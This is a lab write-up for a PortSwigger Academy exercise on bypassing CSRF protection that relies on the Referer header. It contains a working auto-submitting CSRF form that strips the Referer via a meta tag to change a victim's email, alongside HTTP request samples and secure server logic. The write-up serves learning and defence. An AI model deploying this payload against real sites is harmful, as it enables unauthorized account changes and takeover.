# PortSwigger Lab: CSRF where Referer validation depends on header being present

![PortSwigger](https://img.shields.io/badge/Platform-PortSwigger%20Academy-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Type](https://img.shields.io/badge/Type-CSRF%20Referer%20Bypass-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

Writeup on bypassing CSRF protection via Referer header validation with insecure fallback.

## Techniques Used

- Cross-Site Request Forgery (CSRF)
- Referer header manipulation
- Meta referrer policy (`content="never"`)
- HTML meta tag exploitation
- Insecure fallback logic bypass

## Attack Summary

```
Analyze email change request
→ No CSRF token, only Referer validation
→ Normal CSRF payload fails (Referer blocked)
→ Discover: Missing Referer = Request allowed
→ Use <meta name="referrer" content="never">
→ Browser omits Referer header
→ Server's fallback: "No Referer? OK, allow it!"
→ Deploy on exploit server
→ Victim's email changed
```

## Key Vulnerability

**Insecure fallback logic:**

```javascript
if (referer_present) {
  if (is_same_origin) {
    allow();
  } else {
    reject();
  }
} else {
  allow();  // ❌ WRONG: Should reject
}
```

Server assumes: "If no Referer header = legitimate internal request"

This is **incorrect** because browsers can be forced to omit Referer via meta tag.

## Request Analysis

### Legitimate Request
```http
POST /my-account/change-email HTTP/2
Referer: https://target.com/my-account?id=wiener
Origin: https://target.com
Cookie: session=...

email=user@user.es
```

**Protected by:** Referer header is same-origin

### Attack Request (Normal CSRF)
```http
POST /my-account/change-email HTTP/2
Referer: https://exploit-server.net/
Origin: https://exploit-server.net
Cookie: session=... (SameSite=None)

email=hacked@hacked.com
```

**Result:** ❌ Blocked (Referer is cross-origin)

### Attack Request (Meta Referrer)
```http
POST /my-account/change-email HTTP/2
[NO Referer header]
Origin: null
Cookie: session=... (SameSite=None)

email=hacked@hacked.com
```

**Result:** ✅ Allowed (Referer missing = fallback allows it)

## Exploit Payload

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<meta name="referrer" content="never">
<form method="POST" 
      action="https://target.web-security-academy.net/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value='hacked@hacked.com'>
</form>
<script>
  document.forms[0].submit();
</script>
```

## How Meta Referrer Works

`<meta name="referrer" content="never">` tells browser:
- Do **not** send Referer header on any request
- Browser completely omits the `Referer:` header
- Server sees missing header → Uses fallback logic → Allows request

## Meta Referrer Policy Options

| Policy | Behavior |
|--------|----------|
| `never` | Never send Referer |
| `same-origin` | Send only on same-origin requests |
| `strict-origin` | Send on same-origin or more secure |
| `no-referrer-when-downgrade` | Default behavior |

## Vulnerable Server Logic

```javascript
// What server does
if (req.headers.referer) {
  if (isSameOrigin(req.headers.referer)) {
    acceptRequest();
  } else {
    rejectRequest();
  }
} else {
  acceptRequest();  // ❌ INSECURE FALLBACK
}
```

## Secure Server Logic

```javascript
// What it should do
if (!req.headers.referer || !isSameOrigin(req.headers.referer)) {
  rejectRequest();  // Always require valid Referer
}

// Better: Use CSRF tokens
if (!isValidCSRFToken(req.body.csrf_token)) {
  rejectRequest();
}
```

## Attack Steps

1. **Analyze** - Email change endpoint has no CSRF token
2. **Discover** - Only protection is Referer header validation
3. **Test** - Manually remove Referer in Burp → Request accepted
4. **Exploit** - Use `<meta name="referrer" content="never">`
5. **Deploy** - Host on exploit server
6. **Execute** - Deliver to victim
7. **Result** - Victim's email changed

## Key Insight

Relying solely on Referer header validation is insufficient because:
- **Cannot be trusted** - Browsers can omit it via meta tag
- **User-controllable** - Can be manipulated via client-side techniques
- **Not cryptographic** - No proof of same-origin (like CSRF tokens)

## References

- [PortSwigger — CSRF Prevention](https://portswigger.net/web-security/csrf)
- [MDN — Referrer Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- [MDN — Meta Referrer Tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name#referrer)
- [OWASP — CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
